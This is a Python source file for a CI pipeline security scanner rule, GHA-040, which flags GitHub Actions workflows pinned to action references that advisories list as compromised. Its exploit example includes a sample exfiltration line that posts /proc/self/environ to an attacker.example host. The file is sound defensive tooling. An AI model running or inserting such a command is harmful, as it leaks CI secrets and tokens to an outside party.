"""GHA-040. Workflow uses a known-compromised action reference.

Foundation rule of the GHA-04x action-reputation pack. Where
GHA-001 prevents the *vulnerability* (tag pin instead of SHA pin)
and GHA-025 catches mass-renaming primitives, GHA-040 catches the
*active compromise*: the workflow is pinned to a SHA or tag value
that a public advisory has flagged as known-malicious.

Pure data lookup against a curated registry (``_compromised_
actions.py``); no network access. Registry entries are added by
PR with the citing CVE / GHSA / vendor advisory in the commit
message.
"""
from __future__ import annotations

from typing import Any

from ...base import Finding, Location, Severity
from ...rule import Rule
from .._compromised_actions import lookup
from ..base import iter_jobs, iter_steps, step_location
from ..uses_parser import parse_uses

RULE = Rule(
    id="GHA-040",
    title="Action reference matches a known-compromised SHA or tag",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-3", "CICD-SEC-8"),
    esf=("ESF-S-PIN-DEPS", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-829", "CWE-506"),
    recommendation=(
        "Rotate every secret that may have been reachable to a "
        "workflow run that hit the compromised reference, then "
        "update the ``uses:`` reference to a known-clean SHA "
        "published by the upstream maintainer post-incident "
        "(usually announced in the advisory body). Audit CI logs "
        "for the affected window for any sign that the malicious "
        "payload ran against this repo."
    ),
    docs_note=(
        "Walks every workflow's ``steps[].uses:`` and "
        "``jobs.<id>.uses:`` references against the curated "
        "compromised-action registry in "
        "``pipeline_check.core.checks.github._compromised_actions``. "
        "Match is case-insensitive on owner / repo and exact on "
        "the ``ref`` value (commit SHA or tag name). Registry is "
        "deliberately small and append-only — refresh by PR with "
        "the citing advisory in the commit message; no fetch-from-"
        "network registry to avoid taking on a telemetry surface."
    ),
    incident_refs=(
        "tj-actions/changed-files compromise "
        "([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), "
        "March 2025): the canonical case the registry was built "
        "for. Roughly 23,000 tag-pinned repos shipped CI secrets "
        "to an exfiltration endpoint over a ~24-hour window before "
        "GitHub blocked the malicious commits.",
        "reviewdog/action-setup compromise "
        "([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), "
        "March 2025): same week as tj-actions; smaller blast "
        "radius but identical mechanism. Tag-pinned consumers "
        "were affected; SHA-pinned consumers who happened to "
        "match the malicious commit were also affected.",
    ),
    known_fp=(
        "The registry covers only public, advisory-confirmed "
        "compromises. Pre-disclosure compromises and "
        "yet-unpublished maintainer-account takeovers do not land "
        "until the citing CVE / GHSA exists. Pair with GHA-001 "
        "(SHA pinning) and GHA-025 (tag-rewrite detection) for "
        "the prevention angle.",
    ),
    exploit_example=(
        "# Vulnerable: pinned to a SHA the attacker landed under @v45.\n"
        "# (Substitute the actual malicious-commit SHA from the CVE-2025-30066\n"
        "# advisory; the registry in _compromised_actions.py carries it.)\n"
        "- uses: tj-actions/changed-files@<advisory-malicious-sha>\n"
        "\n"
        "# Same applies to tag pins that resolved to the malicious\n"
        "# commit during the compromise window:\n"
        "- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit\n"
        "\n"
        "# Attack: the injected action body exfiltrated CI secrets by\n"
        "# dumping the runner process environment to a controlled host:\n"
        "#   curl -X POST https://attacker.example/exfil \\\n"
        "#     -d \"$(cat /proc/self/environ)\"\n"
        "#\n"
        "# Every workflow run that hit one of those refs over the\n"
        "# compromise window leaked the entire env block, including\n"
        "# ${{ secrets.* }} and GITHUB_TOKEN.\n"
        "\n"
        "# Safe: pin to the post-incident clean SHA the maintainer\n"
        "# republished in the advisory (consult the GHSA the registry\n"
        "# cites for the exact value):\n"
        "- uses: tj-actions/changed-files@<advisory-clean-sha>"
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    matches: list[str] = []
    locations: list[Location] = []
    advisories: set[str] = set()

    def _scan_uses_value(value: Any, step_for_loc: dict[str, Any] | None) -> None:
        ref = parse_uses(value)
        if ref is None:
            return
        if ref.kind not in {"remote-action", "remote-workflow"}:
            return
        if not ref.owner or not ref.repo or not ref.ref:
            return
        hit = lookup(ref.owner, ref.repo, ref.ref)
        if hit is None:
            return
        matches.append(ref.raw)
        advisories.add(hit.advisory)
        if step_for_loc is not None:
            locations.append(step_location(path, step_for_loc))

    for _, job in iter_jobs(doc):
        # Reusable-workflow callees: jobs.<id>.uses:
        _scan_uses_value(job.get("uses"), step_for_loc=None)
        # Step-level action refs (the common case).
        for step in iter_steps(job):
            _scan_uses_value(step.get("uses"), step_for_loc=step)

    passed = not matches
    if passed:
        desc = (
            "No workflow ``uses:`` reference matches a known-"
            "compromised SHA or tag in the curated registry."
        )
    else:
        # Single match -> point straight at the advisory; multiple
        # -> summarize and let the operator follow up via --explain.
        ref_summary = ", ".join(sorted(set(matches))[:3])
        if len(set(matches)) > 3:
            ref_summary += f" (+{len(set(matches)) - 3} more)"
        adv_summary = "; ".join(sorted(advisories))
        desc = (
            f"{len(matches)} action reference(s) match a known-"
            f"compromised SHA or tag: {ref_summary}. Rotate any "
            f"secret a run of this workflow could reach, then "
            f"update to a post-incident clean ref. Advisory: "
            f"{adv_summary}"
        )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
